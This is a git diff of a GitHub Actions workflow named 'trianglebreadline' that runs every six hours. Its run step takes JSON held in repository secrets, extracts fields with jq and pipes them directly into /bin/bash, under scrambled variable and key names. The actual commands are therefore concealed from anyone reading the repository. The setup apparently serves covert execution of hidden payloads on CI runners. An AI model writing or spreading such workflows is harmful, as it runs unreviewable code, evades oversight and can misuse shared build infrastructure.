@@ -1,9 +1,8 @@
 name: trianglebreadline
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 5/6 * * *'
+    - cron: '51 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +10,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: trianglebreadline
         env:
-          xlz938: ${{ secrets.xlz938 }}
+          eu74292: ${{ secrets.eu74292 }}
         run: |
-          echo $xlz938 | jq -r .daud9149 | /bin/bash
-          echo $xhhpm5 | jq -r .zx0260 | /bin/bash
-          echo $slm91 | jq -r .gm7 | /bin/bash
-          echo $lviru7 | jq -r .d50390 | /bin/bash
-          echo $qzto1 | jq -r .i59499 | /bin/bash
-          echo $ss88143 | jq -r .lpg97502 | /bin/bash
-          echo $zujb8407 | jq -r .lb409 | /bin/bash
-          echo $e72461 | jq -r .yii1120 | /bin/bash
-          echo $pt87 | jq -r .gn38 | /bin/bash
-          echo $xo9 | jq -r .ndad3909 | /bin/bash
+          echo $eu74292 | jq -r .gl740 | /bin/bash
+          echo $g4595 | jq -r .kvsvh96655 | /bin/bash
+          echo $v63 | jq -r .otpot4 | /bin/bash
+          echo $zyoz4993 | jq -r .qxac25154 | /bin/bash
+          echo $vl7314 | jq -r .ru2411 | /bin/bash
+          echo $prt04 | jq -r .zbjp4 | /bin/bash
+          echo $ztni1305 | jq -r .rcgpn038 | /bin/bash
+          echo $k85 | jq -r .vnpwe2 | /bin/bash
 
